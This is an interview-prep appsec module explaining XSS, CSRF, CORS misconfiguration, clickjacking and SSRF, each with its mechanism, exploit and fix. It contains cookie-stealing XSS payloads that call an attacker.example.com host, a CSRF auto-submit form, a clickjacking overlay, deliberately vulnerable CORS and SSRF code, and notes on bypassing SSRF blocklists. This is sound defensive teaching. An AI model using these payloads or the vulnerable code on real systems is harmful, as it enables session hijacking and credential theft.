# XSS, CSRF, CORS, Clickjacking, SSRF — Mechanism, Exploit, and Fix

> **Track:** T30 Auth & Application Security · **Time:** 3h · **Prereqs:** `T30-token-lifecycle`
> **Updated:** 2026-07-26
> **Module id:** `T30-web-attacks` · **Tags:** appsec, critical

## The 30-second version

XSS lets an attacker run their own JavaScript in a victim's browser under your origin — stored (persisted server-side, hits every viewer), reflected (round-tripped through a request, hits whoever clicks a crafted link), or DOM-based (never touches the server, purely client-side sink) — and Content Security Policy is the actual architectural defense, not output-encoding alone. CSRF tricks a victim's authenticated browser into firing a request the victim never intended, defeated by `SameSite` cookies plus an unpredictable per-session token the attacker's page can't read. CORS is a browser-enforced relaxation of the same-origin policy that tells browsers which *other* origins may read a response via JavaScript — it is not a server-hardening control and does nothing to stop a direct, non-browser request (curl, a server-side call) from reaching your API at all, which is the single most common CORS misunderstanding. Clickjacking overlays an invisible iframe of your real site over a decoy UI, defeated by `X-Frame-Options`/`frame-ancestors`. SSRF tricks your server into making a request to a URL of the attacker's choosing, and the case that matters most in cloud environments is the metadata endpoint (`169.254.169.254`) — the exact mechanism behind the 2019 Capital One breach, where a WAF's SSRF vulnerability was chained into IAM credential theft.

## Why this gets asked

Because these five are the bread-and-butter of OWASP's Top 10 and the vulnerabilities most likely to show up in an actual pentest against something you built — the interviewer wants concrete mechanism-exploit-fix fluency, not name recognition, because "I know what XSS is" and "I can explain why `httpOnly` doesn't stop a live XSS payload from acting as the user" are very different levels of understanding, and they've probably shipped a fix for at least one of these in production.

---

## Lineage: past → present → future

**What came before.** Early web applications rendered user input directly into HTML with no escaping at all, because the browser security model of the mid-to-late 1990s hadn't yet been forced to reckon with an internet full of adversarial input — the same-origin policy existed to isolate one site's script from reading another's DOM, but nothing stopped a site from unwittingly reflecting an attacker's script back to a victim as if it were the site's own content. XSS as a named, understood vulnerability class dates to the early 2000s; CSRF was documented as a distinct threat around the same period (Peter Watkins' 2001 mailing-list post is often cited as an early formal naming), and both persisted for years afterward because the fixes required disciplined, cross-cutting engineering practice (escape every output, verify every state-changing request's origin) rather than a single library fix — this is precisely the kind of vulnerability class that keeps reappearing decade after decade in new frameworks, because the underlying browser trust model (a request carries cookies automatically; a page can embed arbitrary content) hasn't fundamentally changed even as tooling has.

**Where it stands now.** Modern frameworks (React, Vue, Angular) auto-escape template output by default, closing the most common historical XSS vector (naive string concatenation into HTML) for anything going through the framework's own rendering path — but `dangerouslySetInnerHTML`, `v-html`, and their equivalents remain deliberate escape hatches that reintroduce the exact same risk the framework otherwise closes, and DOM-based XSS (a client-side sink like `element.innerHTML = location.hash` with no server round-trip at all) is now the more common finding in modern SPA-heavy codebases specifically because so much rendering logic has moved client-side. `SameSite` cookies (Chromium defaulting to `Lax` since Chrome 80, February 2020) provide meaningful *baseline* CSRF protection essentially for free across the ecosystem now, but the security community's live disagreement is whether `SameSite` alone is sufficient — PortSwigger and others have documented real bypass techniques (client-side redirects, sibling-domain quirks, certain top-level navigation edge cases) that mean defense-in-depth with an explicit anti-CSRF token remains the recommended posture for anything sensitive, not `SameSite` alone. CORS misconfiguration (reflecting `Access-Control-Allow-Origin` from the request's `Origin` header combined with `Access-Control-Allow-Credentials: true`) remains a routinely-found, high-impact misconfiguration in bug bounty programs, precisely because the "CORS is a security boundary" misunderstanding persists among engineers who configure it defensively rather than understanding what it actually does and doesn't protect. SSRF was formally added as its own OWASP Top 10 category in 2021 (A10:2021) reflecting how common and how consequential it had become with the rise of cloud metadata services as a juicy target; in the 2025 Top 10 refresh, SSRF was folded back into the broader Broken Access Control category rather than standing alone, though the underlying vulnerability and its cloud-specific severity haven't changed.

**Where it's heading.** CSP adoption with strict, nonce-based or hash-based policies (rather than permissive `unsafe-inline`/allowlists of entire domains) is the direction of travel for XSS defense-in-depth, moving away from CSP-as-an-afterthought toward CSP as a build-time-generated, per-response artifact tightly coupled to exactly which scripts a page actually loads. IMDSv2 (AWS's session-token-based metadata service, introduced in 2019 specifically in response to SSRF-based credential theft) is increasingly the default rather than opt-in on new instances, closing the simplest SSRF-to-credential-theft chain, though a real and persistent gap remains: many existing production environments still run instances with IMDSv1 enabled, and defense-in-depth (network-layer blocking of the metadata IP from application containers, least-privilege IAM roles limiting blast radius even if credentials are stolen) remains necessary regardless of IMDS version because SSRF against *other* internal services (not just the metadata endpoint) is unaffected by IMDSv2 entirely.

---

## Mental model

```
  FIVE ATTACKS, FIVE TRUST ASSUMPTIONS THE BROWSER/SERVER MAKES THAT BREAK

  XSS          "the HTML I'm rendering only contains what I put there"
               -> attacker's script ends up in YOUR page, running as YOU

  CSRF         "a request with valid cookies came from MY page's own UI"
               -> browser auto-attaches cookies to ANY site's request to you

  CORS         "the browser blocking cross-origin reads protects my SERVER"
               -> CORS protects the BROWSER'S USER, not your server; a non-
                  browser client (curl, server-to-server) ignores CORS entirely

  CLICKJACKING "the user clicked what they saw"
               -> invisible iframe of YOUR real page sits UNDER the decoy UI
                  the user thinks they're clicking

  SSRF         "the URL I'm fetching is the one the FEATURE intended"
               -> attacker redirects your server's OWN request to wherever
                  they choose — including infrastructure only YOUR SERVER
                  can reach, like the cloud metadata endpoint
```

---

## How it actually works

### 1. XSS (Cross-Site Scripting)

**Mechanism.** Untrusted input ends up interpreted as executable script in a victim's browser, in the security context (origin) of the vulnerable site — meaning the attacker's script can read cookies (unless `httpOnly`), make authenticated requests as the victim, read the DOM, and exfiltrate anything the page has access to.

- **Stored XSS** — the payload is saved server-side (a comment, a profile field, a support ticket) and served to every subsequent viewer. Highest severity: one injection, many victims, no click required beyond viewing the page.
- **Reflected XSS** — the payload is part of the request itself (a query parameter) and reflected directly into the response with no persistence. Requires tricking a victim into clicking a crafted link, but requires no stored-data write access from the attacker.
- **DOM-based XSS** — the payload never touches the server at all; a client-side script reads untrusted data (`location.hash`, `document.referrer`, a URL parameter read via `URLSearchParams`) and writes it into a dangerous sink (`innerHTML`, `document.write`, `eval`) entirely within the browser.

**Exploit.**

```html
<!-- Stored XSS: a comment field with no output encoding -->
<script>fetch('https://attacker.example.com/steal?c=' + document.cookie)</script>

<!-- Reflected XSS: a search page that echoes the query unescaped -->
https://vulnerable.example.com/search?q=<script>fetch('https://attacker.example.com/steal?c='+document.cookie)</script>

<!-- DOM-based XSS: no server round-trip, purely client-side -->
<!-- vulnerable.example.com/page.html contains: -->
<script>document.getElementById('welcome').innerHTML = "Hello, " + location.hash.slice(1);</script>
<!-- attacker sends: https://vulnerable.example.com/page.html#<img src=x onerror=fetch('https://attacker.example.com/steal?c='+document.cookie)> -->
```

**Fix — layered, not single-point.**

1. **Output encoding, context-aware.** Escape for the specific context the data lands in (HTML body, HTML attribute, JS string, URL) — HTML-escaping alone doesn't protect a value injected into a `<script>` block or an `onclick` attribute. Modern frameworks (React, Vue) do this by default for their own template syntax; the risk concentrates in explicit escape hatches (`dangerouslySetInnerHTML`, `v-html`, raw template interpolation).
2. **Content Security Policy (CSP)** — the actual architectural backstop, not a nice-to-have. A strict policy (`script-src 'self' 'nonce-<random-per-response>'`, no `unsafe-inline`, no wildcard domains) means even if an attacker succeeds at injecting an inline `<script>` tag, the browser refuses to execute it because it doesn't carry the correct nonce — this is defense-in-depth that survives an output-encoding bug elsewhere in the codebase, which is exactly why it matters: it doesn't rely on getting every single output point right, only on the policy header being correctly set once.
3. `httpOnly` on session/auth cookies (module 5) — doesn't prevent XSS, but bounds what a successful XSS payload can do (can't exfiltrate the raw cookie value for later reuse, though it can still act as the user live).

### 2. CSRF (Cross-Site Request Forgery)

**Mechanism.** Browsers automatically attach a site's cookies to any request to that site, regardless of which page initiated the request. If a state-changing endpoint (`POST /account/transfer`) relies solely on "does this request carry a valid session cookie" as its authorization check, any page anywhere on the internet can trigger that request on a logged-in victim's behalf — the victim's browser does the work, using cookies the victim never consciously re-provided.

**Exploit.**

```html
<!-- Hosted on attacker.example.com; victim just needs to view this page while
     logged into vulnerable-bank.example.com in the same browser -->
<form action="https://vulnerable-bank.example.com/account/transfer" method="POST" id="f">
  <input type="hidden" name="to_account" value="attacker-account-1234">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>
<!-- The browser attaches vulnerable-bank.example.com's session cookie
     automatically — the request looks, server-side, identical to a
     legitimate transfer initiated by the victim's own click. -->
```

**Fix.**

1. **`SameSite=Lax` or `Strict` on cookies.** `Lax` (Chromium's default since 2020) blocks the cookie from being sent on cross-site POST requests like the form above, while still allowing it on top-level navigation (clicking a link) for usability; `Strict` blocks it even for top-level navigation, at some UX cost (a user clicking a link from an email to a logged-in site would appear logged out on first load). This closes the *classic* cross-site-form-POST CSRF case largely for free.
2. **Anti-CSRF (synchronizer) token** — a random, unpredictable value embedded in the legitimate page's form and required as a parameter on submission, which the attacker's forged form has no way to read or predict (same-origin policy prevents the attacker's page from reading the victim's page content to steal the token). Still recommended as defense-in-depth even with `SameSite` set, because documented bypasses exist for `SameSite` alone in specific edge cases (certain redirect chains, some cross-subdomain scenarios).
3. **Checking `Origin`/`Referer` headers** on state-changing requests as an additional signal — not sufficient alone (headers can occasionally be stripped by privacy tools or proxies, producing false negatives if used as a hard block) but useful as a secondary check.

### 3. CORS — what it actually protects, and the common misunderstanding

**Mechanism, precisely.** The same-origin policy is the browser's default: a page loaded from origin A cannot use JavaScript to read a response from origin B. CORS is the mechanism by which origin B can *opt in* to relaxing that restriction for specific origins — a server sends `Access-Control-Allow-Origin: https://trusted-partner.example.com` and the browser then permits `trusted-partner.example.com`'s JavaScript to read the response it already received (the request itself, for simple requests, was already sent and processed server-side regardless of CORS — CORS controls whether the *browser* lets the calling page's JS *read the response*, not whether the request reaches the server at all).

**The misunderstanding, stated precisely.** CORS is enforced entirely by the browser, on behalf of the page's own user, to prevent a malicious page from reading data from a *different* site the user happens to be logged into. It says nothing to, and does nothing against, a request made directly to your API — via `curl`, a server-side HTTP client, Postman, or any non-browser context — because there's no browser JavaScript execution context for CORS to apply to in the first place. **CORS is not a server-hardening control; it's a same-origin-policy carve-out for browsers.** An API with no authentication at all is exactly as unauthenticated with a strict CORS policy as with a permissive one — CORS never was, and was never designed to be, the thing standing between an attacker and your unauthenticated endpoint.

**Exploit — the actual CORS misconfiguration that matters.**

```python
# VULNERABLE: reflecting the request's own Origin header back, combined
# with allowing credentials — this DOES create a real vulnerability,
# just not the one people usually assume CORS protects against
@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = request.headers.get("Origin", "*")
    response.headers["Access-Control-Allow-Credentials"] = "true"   # THE DANGEROUS COMBINATION
    return response
# Now ANY origin (including attacker.example.com) is told "yes, you may
# read this response, WITH the victim's cookies attached" — a page on
# attacker.example.com can now make an authenticated, credentialed
# cross-origin request and read the JSON response containing the
# victim's private data, entirely via the victim's own browser.
```

**Fix.** Never reflect `Origin` back unconditionally when `Access-Control-Allow-Credentials: true` is set — maintain an explicit allowlist of trusted origins. And separately, never treat CORS configuration itself as an authentication or authorization mechanism — every endpoint still needs its own real authentication check, because CORS's only job is telling browsers which *other pages'* JavaScript may read a response, not deciding who may make the underlying request.

### 4. Clickjacking

**Mechanism.** An attacker loads the victim's real, authenticated site in a transparent (opacity: 0 or otherwise visually hidden) `<iframe>`, positioned precisely over a decoy UI the attacker controls (a "click here to win a prize" button positioned exactly where the real site's "confirm" button sits underneath). The victim believes they're clicking the decoy; they're actually clicking the real site's button, authenticated as themselves, because the iframe carries the victim's real session.

**Exploit.**

```html
<style>
  iframe { opacity: 0.001; position: absolute; top: 130px; left: 400px; width: 200px; height: 40px; z-index: 2; }
  .decoy-button { position: absolute; top: 130px; left: 400px; z-index: 1; }
</style>
<div class="decoy-button">Click to claim your free prize!</div>
<iframe src="https://vulnerable.example.com/account/delete-confirm"></iframe>
<!-- victim clicks what they think is the decoy button, actually clicking
     the real "delete account" confirm button inside the invisible iframe,
     authenticated with their own real session cookie -->
```

**Fix.** `X-Frame-Options: DENY` (or `SAMEORIGIN` if legitimate same-site framing is needed) is the older, widely-supported header; the modern, more flexible equivalent is CSP's `frame-ancestors` directive (`Content-Security-Policy: frame-ancestors 'none'`), which supersedes `X-Frame-Options` where supported and allows a specific allowlist of framing origins rather than an all-or-nothing choice. Both instruct the browser to refuse to render the page inside a frame at all (or only within an approved origin), which prevents the invisible-iframe overlay entirely.

### 5. SSRF (Server-Side Request Forgery)

**Mechanism.** A server-side feature that fetches a URL on behalf of the application (a webhook validator, an image-fetch-by-URL feature, a PDF-generator that renders a remote page, an XML parser resolving an external entity) trusts a user-supplied URL without adequately restricting where it can point — allowing the attacker to redirect the *server's own* request to an internal resource the attacker could never reach directly, since the server itself, not the attacker's browser, is what's making the request.

**The case that matters most: cloud metadata endpoints.** In AWS, EC2 instances can query `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` with no authentication at all to retrieve temporary IAM credentials for the instance's attached role — a deliberately unauthenticated, link-local endpoint by design, reachable only from inside the instance itself. If an attacker can make your server fetch an arbitrary URL, pointing it at this address extracts live cloud credentials.

**Exploit — the 2019 Capital One breach, the canonical real-world case.** A misconfigured Web Application Firewall running on an EC2 instance had an SSRF vulnerability; the attacker crafted a request that made the WAF fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/<the-WAF's-role-name>`, received back temporary IAM credentials for that instance's attached role, and used those credentials — which had read access to S3 buckets containing customer data — to exfiltrate over 100 million customer records. The vulnerability chain was SSRF → credential theft → mass data exfiltration, all from a single crafted HTTP request; no direct network access to the S3 buckets or any credential brute-forcing was needed at all.

```python
# VULNERABLE: fetch a user-supplied URL with no restriction
@app.post("/api/fetch-preview")
def fetch_preview():
    url = request.json["url"]
    resp = requests.get(url)   # attacker sets url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role"
    return resp.text            # returns live IAM credentials to the attacker
```

**Fix.**

1. **IMDSv2 (AWS) or equivalent session-bound metadata services** — requires a session-token handshake (a `PUT` request to obtain a token, then using that token in subsequent metadata `GET` requests) that a simple SSRF-triggered `GET` cannot replicate, since a basic SSRF vulnerability typically lets an attacker control the URL of a single outbound `GET` request, not orchestrate a full multi-step handshake. This is a real, meaningful mitigation but requires being explicitly enabled/enforced on the instance — it is not universally on by default across all existing deployments even in 2026, and many production environments still have IMDSv1-capable instances.
2. **Allowlist destinations, never blocklist.** Validate the user-supplied URL against an explicit allowlist of permitted hosts/schemes for the specific feature; blocklisting known-bad addresses (`169.254.169.254`, `localhost`, `127.0.0.1`, RFC 1918 ranges) is fragile against encoding tricks (decimal/octal IP representations, DNS rebinding, redirects that resolve to a blocked address only after the initial DNS check passes).
3. **Network-layer isolation.** Block outbound access to the metadata endpoint from application containers/processes that have no legitimate reason to reach it, using IAM roles scoped to least privilege so that even a successful credential theft yields minimal-blast-radius access rather than broad S3/account access, as in the Capital One case.
4. **Disable unnecessary URL-fetching features entirely** where the business need doesn't justify the risk, or route them through a dedicated, network-isolated proxy service with no access to internal infrastructure at all.

---

## Build it from scratch

A minimal harness illustrating the CORS misconfiguration and the CSRF fix together, since they're the pair most often confused with each other:

```python
# untested sketch — Flask-style pseudocode illustrating both the bug and the fix
from flask import Flask, request, make_response
import secrets

app = Flask(__name__)
TRUSTED_ORIGINS = {"https://app.example.com", "https://admin.example.com"}

# --- CORS: allowlist, never reflect blindly ---
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get("Origin")
    if origin in TRUSTED_ORIGINS:                      # explicit allowlist check
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    # if origin not in allowlist: no CORS headers set at all — browser
    # blocks the calling page's JS from reading the response. Note this
    # does NOT stop the request itself from reaching this handler —
    # CORS only gates whether the CALLER'S JS can read the response.
    return response

# --- CSRF: SameSite cookie + explicit token, defense in depth ---
@app.post("/account/transfer")
def transfer():
    session_csrf_token = get_session_csrf_token(request)   # stored server-side at login
    submitted_token = request.form.get("csrf_token")
    if not submitted_token or not secrets.compare_digest(submitted_token, session_csrf_token):
        return make_response("CSRF validation failed", 403)
    # ... proceed with the actual transfer, now confident this request
    # originated from a page that could read the real session's token,
    # which an attacker's cross-origin forged form cannot do.
    return do_transfer(request.form)

@app.get("/account/transfer-form")
def transfer_form():
    token = generate_and_store_csrf_token(request)
    resp = make_response(render_form_with_token(token))
    resp.set_cookie("session", get_session_id(request),
                     httponly=True, secure=True, samesite="Lax")
    return resp
```

Full lab with a working stored-XSS-to-cookie-theft chain (in a sandboxed test app), a CSRF proof-of-concept form, and an SSRF harness against a mock metadata endpoint: **`(lab pending)`**.

---

## How it's done in production

**CSP deployment** — generated per-response with a fresh random nonce for each page load (`Content-Security-Policy: script-src 'self' 'nonce-<random>'`), requiring every legitimate inline script to carry the matching nonce attribute; report-only mode (`Content-Security-Policy-Report-Only`) is commonly used first to gather violation reports without breaking functionality, before flipping to enforcing mode. Frameworks like Next.js and various CSP middleware packages automate nonce generation and injection.

**CSRF tokens at scale** — most modern web frameworks (Django, Rails, ASP.NET) include built-in CSRF middleware handling token generation, embedding, and validation automatically for form submissions, requiring only that developers not disable it (a real, recurring mistake for API endpoints where developers disable CSRF protection broadly "because it's an API" without considering that cookie-authenticated API endpoints called from a browser are exactly as CSRF-vulnerable as traditional form submissions).

**SSRF protection services** — some organizations route all outbound, user-influenced HTTP fetches through a dedicated egress proxy service that enforces the URL allowlist/blocklist centrally and has no network path to internal infrastructure itself, rather than trusting every individual service that might need to fetch a URL to implement SSRF protection correctly and consistently.

### Failure-mode table

| Symptom | Cause | Fix |
|---|---|---|
| Cookie exfiltrated via a comment field, used to hijack sessions site-wide | Stored XSS, no output encoding, no CSP | Context-aware output encoding + strict CSP with nonces, `httpOnly` on session cookies to bound (not prevent) damage |
| Users' accounts drained by unauthorized transfers with no phishing involved | CSRF — state-changing endpoint trusted cookie presence alone | `SameSite=Lax/Strict` + anti-CSRF token on all state-changing requests |
| API returns private data to a page on an unrelated domain | CORS misconfigured — `Origin` reflected + `Allow-Credentials: true` | Explicit origin allowlist; never reflect `Origin` blindly when credentials are allowed |
| curl directly to the API succeeds despite a "restrictive" CORS policy | Misunderstanding — CORS never blocked the request itself, only browser-JS response reading | Add actual authentication/authorization; stop relying on CORS as a security boundary |
| User "confirmed" an action they never intended, no phishing link clicked | Clickjacking via invisible iframe overlay | `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` |
| Cloud IAM credentials appear in outbound traffic to an unfamiliar external endpoint | SSRF chained to metadata-endpoint credential theft | IMDSv2, URL allowlisting, network-layer blocking of the metadata IP from app containers, least-privilege IAM roles |

---

## Tradeoffs & when NOT to use it

- **Don't rely on output encoding alone for XSS defense.** It must be correct at every single output point across the entire codebase forever, including every future change — CSP is the layer that survives a single missed encoding call, and skipping it because "we already encode everything" is exactly the assumption that historically proves wrong at scale.
- **Don't treat `SameSite` cookies as sufficient CSRF protection on their own for high-sensitivity actions** (financial transfers, permission changes, account deletion) — documented bypass techniques exist, and an explicit anti-CSRF token is cheap insurance that closes a gap `SameSite` alone leaves open in some real, if uncommon, configurations.
- **Don't configure CORS defensively as if it were an authentication mechanism.** A wide-open CORS policy on a properly-authenticated, properly-authorized API is a non-issue for confidentiality (an attacker's page reading the response still needs the victim's valid session/credentials to get an authenticated response back in the first place) — the actual danger is specifically the credentialed-reflected-origin combination, not permissive CORS in isolation.
- **Don't blocklist SSRF targets instead of allowlisting them.** Blocklists are a losing game against DNS rebinding, redirect chains, and alternate IP encodings; if a feature only ever needs to fetch from a known, bounded set of hosts, allowlist exactly those hosts.
- **CSP with `unsafe-inline` provides essentially no protection against the attack it exists to stop** — it's sometimes adopted as an easy first step to "have a CSP header" for compliance-checkbox purposes, but a policy permitting all inline scripts defeats the entire mechanism; a nonce- or hash-based policy is meaningfully more work to deploy correctly but is the only version that actually does anything against injected `<script>` tags.
- **Don't disable framework-provided CSRF protection for API endpoints reflexively** — if the endpoint is cookie-authenticated and reachable from a browser context, it's CSRF-vulnerable regardless of whether you call it "an API"; token-based (non-cookie) authentication for pure API clients genuinely sidesteps CSRF, but only if cookies aren't also accepted as an alternate auth path for the same endpoint.

---

## Interview questions

### Q1 — Explain the difference between stored, reflected, and DOM-based XSS, and rank them by real-world severity.
**Testing:** baseline taxonomy plus judgment about actual impact, not just definitions.
**Answer:** Stored XSS persists the payload server-side and hits every subsequent viewer with no additional attacker action — highest severity, since one successful injection compromises an unbounded number of victims. Reflected XSS round-trips through a single request and requires a victim to click a specific crafted link — real but requires active social engineering per victim. DOM-based XSS never touches the server, existing entirely in client-side JavaScript reading an untrusted source (URL fragment, `document.referrer`) into a dangerous sink — increasingly common in modern SPA-heavy codebases precisely because so much logic has moved client-side, and often missed by server-side security scanning since the server never sees the payload at all.
**Follow-up trap:** *"If your codebase uses React everywhere and never touches `dangerouslySetInnerHTML`, are you safe from XSS?"* — safer against the classic HTML-injection vector, but not immune: DOM-based XSS through unsafe use of `location`, `postMessage` handlers accepting unvalidated data, or a third-party script/dependency with its own vulnerability remains possible regardless of React's default auto-escaping, and CSP is still the layer that catches what output encoding alone doesn't.

### Q2 — Does `httpOnly` on a session cookie stop XSS? Be precise.
**Testing:** the specific nuance covered in module 5, restated here in the XSS-attack frame.
**Answer:** No — it stops a successful XSS payload from *reading and exfiltrating* the raw cookie value via JavaScript, but a live XSS payload executing in the victim's browser can still make authenticated requests *as the victim* while it's running, since the browser still attaches the `httpOnly` cookie to those requests automatically; the attacker just can't copy the token out for later, separate, offline reuse. `httpOnly` bounds the blast radius of an XSS incident, it doesn't prevent the incident.
**Follow-up trap:** *"So what does actually stop XSS from being exploitable, if not httpOnly?"* — closing the injection point itself (context-aware output encoding) and CSP as defense-in-depth against whatever encoding gaps remain; `httpOnly` is a mitigation for one specific *consequence* of XSS (token exfiltration), not a fix for XSS itself.

### Q3 — Explain how CSP defends against XSS even when an attacker successfully injects a `<script>` tag into the page.
**Testing:** whether CSP is understood as a browser-enforced execution policy, not a filtering mechanism.
**Answer:** A strict CSP (`script-src 'self' 'nonce-<random-per-response>'`) tells the browser to refuse to execute any script that doesn't either come from an allowlisted source or carry the correct, per-response random nonce. An attacker's injected `<script>` tag has no way to know or predict that response's nonce (it's generated fresh server-side per page load and never exposed anywhere the injection could read it from), so even though the malicious tag is present in the DOM, the browser simply won't execute it — CSP doesn't prevent the injection, it prevents the *execution* of unauthorized script regardless of how it got there.
**Follow-up trap:** *"What if the CSP allows `unsafe-inline`?"* — then it provides essentially zero protection against this specific attack, since `unsafe-inline` tells the browser to execute any inline script regardless of nonce — a permissive CSP is a common but ineffective compliance-checkbox deployment, and the interviewer wants to hear you flag this as a near-worthless configuration rather than "a CSP exists, so we're covered."

### Q4 — A junior engineer says "we don't need CSRF tokens, our API only accepts JSON with `Content-Type: application/json`." Evaluate this claim.
**Testing:** a specific, real, historically-debated CSRF mitigation claim.
**Answer:** This provides *some* protection because simple HTML forms can't natively set an arbitrary `Content-Type` header (they're limited to `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`), so a basic forged-form CSRF attack can't easily produce a `application/json` request without JavaScript — but an attacker's page absolutely can use `fetch()` or `XMLHttpRequest` with a custom `Content-Type` header for a cross-origin request; whether that succeeds depends entirely on whether CORS blocks it (and CORS, remember, protects response-reading, not request-sending — the request still reaches the server and executes, the attacker's JS just can't read the JSON response back, which for a state-changing action that doesn't require reading the response is often irrelevant to the attacker). This is a real but incomplete and commonly overstated mitigation.
**Follow-up trap:** *"So is the Content-Type check useless?"* — not useless, but insufficient alone; it raises the bar slightly against the simplest attack tooling but doesn't stop a determined attacker using `fetch()`, and shouldn't be relied on as your only CSRF defense — `SameSite` cookies plus an explicit anti-CSRF token remain the actual load-bearing controls.

### Q5 — What does CORS actually protect against, and what's the most common misunderstanding about it?
**Testing:** the module's central CORS point, likely the single most valuable answer in this module.
**Answer:** CORS is a browser-enforced relaxation of the same-origin policy, letting a server opt specific other origins into having their JavaScript read a cross-origin response. It protects the *browser's user* from a malicious page silently reading data from a different site the user is authenticated to; it says nothing about, and does nothing to stop, a direct request from a non-browser context (curl, a server, a script) — the underlying request still reaches the server and gets processed regardless of any CORS header, since CORS is enforced entirely on the *reading* side, by the browser, not the *receiving* side, by the server. The common misunderstanding is treating CORS configuration as a server-hardening/authentication control, which it fundamentally is not.
**Follow-up trap:** *"If CORS doesn't stop requests, why does a misconfigured CORS policy matter at all?"* — because the specific dangerous combination — reflecting the request's `Origin` header back unconditionally *and* setting `Access-Control-Allow-Credentials: true` — lets a malicious page make an authenticated (cookie-carrying), cross-origin request via the *victim's own browser* and then successfully *read* the response containing the victim's private data, which is a real confidentiality breach even though the request itself was never blocked by CORS at any point.

### Q6 — Walk through the exact mechanism of the 2019 Capital One breach, and name each stage of the attack chain.
**Testing:** whether the canonical SSRF case is understood as a chain, not a single vulnerability.
**Answer:** A misconfigured Web Application Firewall running on an EC2 instance had an SSRF vulnerability — it could be made to fetch an arbitrary URL. The attacker crafted a request causing the WAF to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`, the unauthenticated-by-design metadata endpoint, retrieving temporary IAM credentials for the instance's attached role. Those credentials happened to have read access to S3 buckets containing customer data, and the attacker used them to exfiltrate over 100 million records. The chain: SSRF vulnerability → metadata endpoint credential theft → S3 data exfiltration, entirely from one crafted HTTP request, no separate credential-guessing or direct network access to the S3 buckets required.
**Follow-up trap:** *"Would IMDSv2 alone have prevented this breach?"* — likely yes for this specific attack pattern, since IMDSv2 requires an explicit session-token handshake (a `PUT` to obtain a token before any metadata `GET` succeeds) that a basic SSRF-controlled single `GET` request can't easily replicate — but IMDSv2 is a mitigation for *this specific vector* (metadata-endpoint credential theft), not for SSRF generally; the same WAF vulnerability could still have been used to reach other internal, non-metadata infrastructure, so IMDSv2 alone wouldn't have made the underlying SSRF bug itself non-issue, only closed this one high-value target.

### Q7 — Why is blocklisting SSRF targets (like blocking `169.254.169.254` and `127.0.0.1` explicitly) considered fragile compared to allowlisting?
**Testing:** understanding of the specific bypass techniques that make blocklists unreliable.
**Answer:** Blocklists have to anticipate every alternate representation an attacker might use — decimal or octal IP encodings (`http://2852039166/` resolves to the same address as a dotted-quad form in some parsers), URL redirect chains where the initial URL passes a blocklist check but redirects to a blocked address afterward, and DNS rebinding (a hostname that resolves to a safe address at check-time and a malicious/internal address at request-time, since DNS resolution and the actual HTTP request are two separate steps an attacker can exploit the gap between). An allowlist of specific permitted hosts sidesteps all of this by only ever permitting the exact hosts a feature legitimately needs, regardless of how creatively an attacker tries to represent a disallowed target.
**Follow-up trap:** *"What if the feature genuinely needs to fetch arbitrary user-supplied URLs, like a general-purpose webhook or link-preview feature?"* — this is the hard case where a pure allowlist doesn't fully apply; the mitigation shifts to network-layer isolation (route the fetch through a sandboxed proxy service with no route to internal infrastructure at all, so even a successful SSRF has nowhere sensitive to reach) combined with strict validation of the resolved IP (not just the hostname) immediately before the request fires, to narrow the DNS-rebinding window as much as possible.

### Q8 — A team disables CSRF protection on an internal admin API because "it's only called by our own frontend, not by any third party." What's the flaw in this reasoning?
**Testing:** whether they connect "internal" to "browser-reachable" correctly.
**Answer:** If the admin API is cookie-authenticated and reachable from a browser (i.e., the admin's browser, logged into the internal tool, can reach it), it's fully CSRF-vulnerable regardless of who the *intended* caller is — an attacker's completely unrelated, external page can still trick the admin's browser into firing a request to the internal API using the admin's own valid session cookie, since the browser doesn't know or care that the request "should" only come from the legitimate frontend. "Only called by our frontend" describes intended usage, not enforced usage, and CSRF exploits exactly that gap.
**Follow-up trap:** *"What if the admin API is only reachable from an internal network, not the public internet?"* — CSRF doesn't require the attacker to reach the API directly; it requires the *victim's browser* to reach it, and the victim's browser is very much on that internal network when the admin is using it. A malicious external webpage the admin merely has open in another tab can still trigger the request through the admin's own browser, which has the necessary network access — network segmentation protects against direct external access, not against a victim's own browser being used as a proxy.

### Q9 — Design the mitigation strategy for a "fetch and preview this URL" feature (like generating a link preview card) that must accept arbitrary user-supplied URLs by its very nature.
**Testing:** applying SSRF mitigations to the genuinely hard case where allowlisting hosts isn't directly possible.
**Answer:** Route the fetch through a dedicated, network-isolated proxy/sandbox service that has no route to internal infrastructure, cloud metadata endpoints, or private IP ranges at all — so even a fully-successful SSRF exploitation of this feature has nowhere sensitive to reach, containing the blast radius architecturally rather than relying on URL validation alone. Layer on top: resolve the hostname and validate the resulting IP is not in a private/link-local/loopback range immediately before firing the request (not just at initial validation, to narrow the DNS-rebinding window), set a strict timeout and response-size limit, and never follow redirects automatically without re-validating the redirect target against the same checks.
**Follow-up trap:** *"Isn't a network-isolated proxy just moving the SSRF problem to a different service?"* — it's deliberately concentrating the risk into one hardened, minimal-privilege, purpose-built component instead of every service that might need this feature independently implementing (and likely inconsistently getting wrong) the same validation logic — the proxy itself still needs to be carefully hardened, but "one well-defended chokepoint" is a materially better posture than "many services each doing ad hoc URL validation."

### Q10 — Your CSP has been in `Report-Only` mode for six months with zero violation reports. Should you flip it to enforcing? What could go wrong?
**Testing:** staff-level judgment about the CSP rollout process and its real-world gaps.
**Answer:** Zero reports over six months is a promising but insufficient signal on its own — `Report-Only` mode only surfaces violations that actually occurred during real traffic in that window, and a codebase can have inline scripts or dynamic-`eval` patterns that simply weren't exercised by any user or automated test during that period (a rarely-hit admin page, an error-handling code path, a seasonal feature). Before flipping to enforcing, cross-check the policy against a full crawl/test suite covering every route and code path, not just production traffic patterns, and consider a staged rollout (enforcing for a percentage of traffic, or for specific route prefixes first) rather than a single global flip.
